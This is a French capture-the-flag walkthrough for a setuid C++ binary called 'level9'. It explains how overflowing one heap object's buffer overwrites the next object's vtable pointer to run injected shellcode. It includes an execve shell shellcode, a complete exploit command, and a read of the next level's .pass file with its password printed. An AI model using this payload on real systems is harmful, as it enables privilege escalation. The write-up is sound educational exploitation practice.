# Level9

## Démarche

1. **Reconnaissance**

   **Permissions / SUID.** Le binaire appartient a `bonus0` et porte le bit setuid :
   un shell ouvert par l'executable tourne avec les droits de `bonus0`
   (l'exploitation reelle se fait hors gdb, qui neutralise le setuid).
     
    **Protections** (`checksec`) : `No RELRO`, `No canary`, **NX disabled**,
   `No PIE`. NX desactive = on pourra executer du **shellcode** directement en
   memoire.

   **C++.** Les symboles sont mangles (`_ZN1N...`) : c'est du C++. On les demangle
   en passant la sortie d'objdump dans `c++filt` :

   ```bash
   objdump -d level9 | c++filt
   ```

   | Symbole | Signification |
   |---------|---------------|
   | `_ZN1NC1Ei` | `N::N(int)` — constructeur |
   | `_ZN1N13setAnnotationEPc` | `N::setAnnotation(char*)` |
   | `_ZN1NplERS_` | `N::operator+(N&)` — virtuel |
   | `_ZN1NmiERS_` | `N::operator-(N&)` — virtuel |
   | `_Znwj` | `operator new(unsigned int)` |

2. **Analyse : structure de la classe N**

   D'apres le constructeur et setAnnotation, l'objet N (taille `0x6c` = 108) :

   ```
   offset 0    : vtable        (pointeur de table virtuelle)
   offset 4    : annotation    (buffer, ~100 octets)
   offset 0x68 : number        (l'int du constructeur)
   ```

   Le constructeur ecrit une adresse en dur a l'offset 0 (`movl $0x8048848,(%eax)`)
   et `number` a l'offset 0x68. On verifie cette adresse dans gdb :

   ```console
   (gdb) x/wx 0x8048848
   0x8048848 <_ZTV1N+8>:   0x0804873a
   ```

   Le symbole `_ZTV1N+8` est tres parlant :

   - `_Z`  : prefixe d'un symbole C++ mangle
   - `T`   : type-related (lie au type)
   - `V`   : **Virtual table** -> c'est une vtable
   - `1N`  : longueur 1 + nom `N` -> la classe N
   - `+8`  : offset de 8 octets ajoute par gdb -> la vtable commence donc 8 octets plus bas, a `0x8048840`

   Donc une **virtual table existe** en memoire a `0x8048840`. Comme le pointeur de
   vtable est l'offset 0 d'une instance, on examine la table complete :

   ```console
   (gdb) x/4wx 0x8048840
   0x8048840 <_ZTV1N>:  0x00000000  0x08048854  0x0804873a  0x0804874e
   ```

   - les 2 premiers mots (`0x00000000`, `0x08048854`) = metadonnees RTTI
     (offset-to-top et pointeur typeinfo), d'ou le pointeur d'objet qui vise
     `_ZTV1N+8` et non `+0`
   - les 2 suivants = les **deux methodes virtuelles** de la classe :

   ```x86asm
   0804873a <N::operator+(N&)>
   0804874e <N::operator-(N&)>
   ```
    la methode virtuel dans le main qui sera appelé sera  `operator+`
   declenche :
   ```x86asm
    804867c:  mov    0x10(%esp),%eax           ; eax = b
    8048680:  mov    (%eax),%eax               ; eax = b->vtable        (1er déréf)
    8048682:  mov    (%eax),%edx               ; edx = *(b->vtable)     (2e déréf) = méthode
   ```
  c'est une **Double indirection**, c'est le mecansime des vtb pour acceder aux methodes vrituelles.


3. **Faille : overflow + ecrasement de vtable**

   `main` cree **deux objets** adjacents sur le heap (`new N(5)`, `new N(6)`),
   remplit le buffer du **premier (a)** avec `argv[1]`, puis fait un **appel
   virtuel** sur le **second (b)** 

   
   D'ailleurs avan l'appel de la methode virtuel l'instance a lance `setAnnotation` qui fait un **memcpy non borne en utlisant `argv[1]`** :

   ```x86asm
   call strlen             ; taille = strlen(argv[1])
   add  $0x4,%edx          ; this+4 = buffer annotation
   call memcpy             ; memcpy(this->annotation, argv[1], strlen(argv[1]))
   ```

   Etant donné que A et B sont contiguss, allons chercher les information de leur adresses sur la heap via leur adresses stoké sur la stack
   **Adresses (lues dans gdb)** :
    ```console
    gdb -q level9
    (gdb) break *0x8048677
    (gdb) run AAAA
    (gdb) x/wx $esp+0x1c      # pointeur a, 0x0804a008
    (gdb) x/wx $esp+0x18      # pointeur b, 0x0804a078
    ```
   - buffer de a = 0x0804a008 +4 = `0x0804a00c`
   - b = `0x0804a078` (sa vtable = offset 0 de b)
   - offset buffer(a) -> vtable(b) = `0x0804a078 - 0x0804a00c` = **il y aura 108 octets a parcourir pour acceder a la vtb de b**

   **Technique** : deborder le buffer de **a** pour ecraser le **pointeur de vtable
   de b**, de sorte que l'appel virtuel saute vers un **shellcode** injecte dans
   le buffer de a.
   
   Petit recap:
   - l'adrese de l'instance A est 0x0804a008
   - buffer A = 0x0804a008 +4 = `0x0804a00c`
   - donc on commence ecrire a cet adresse, en prenant bien compte qu'une double indirection est effectué 

   ```console
    - 0x0804a010        [4 octets]      # (buffer A  + 4 = 0x0804a010) l'adresse ou commence le shellcode dans le buffer A
    - shellcode         [25 octets]     # executer execve("/bin//sh", ["/bin//sh", NULL], NULL)
    - Padding de 'A'    [79 octets]     # pour atteindre l'offset 108 ou se trouve la vtb de b
    - 0x0804a00c        [4 octets]      # ecrase la vtb de B par l'adresse du buffer de A
   ```
   il y aura donc 112 octets dans notre argument passé a l'excutable ./level9

4. **Le shellcode (execve "/bin/sh", 25 octets, AT&T)**

   ```x86asm
    \x31\xc0             xor  %eax,%eax        ; eax = 0
    \x50                 push %eax             ; \0 terminateur
    \x68\x2f\x2f\x73\x68 push $0x68732f2f      ; "//sh"
    \x68\x2f\x62\x69\x6e push $0x6e69622f      ; "/bin"
    \x89\xe3             mov  %esp,%ebx        ; ebx = pointeur vers "/bin//sh"
    \x50                 push %eax             ; \0 = fin de argv
    \x53                 push %ebx             ; pointeur vers la chaîne
    \x89\xe1             mov  %esp,%ecx        ; ecx = argv
    \x31\xd2             xor  %edx,%edx        ; edx = 0 (envp)
    \xb0\x0b             mov  $0xb,%al         ; eax = 11 = syscall execve
    \xcd\x80             int  $0x80            ; appel système
   ```
   ```bash
    '\x10\xa0\x04\x08'` # adresse shellcode
    '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'` # shellcode
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'` # padding
    '\x0c\xa0\x04\x08' # ecrase vtable b
   ```

   ```bash
   ./level9 "$(printf '\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0c\xa0\x04\x08')"
   ```
   ```
    cat /home/user/bonus0/.pass
   ```
    pass = f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728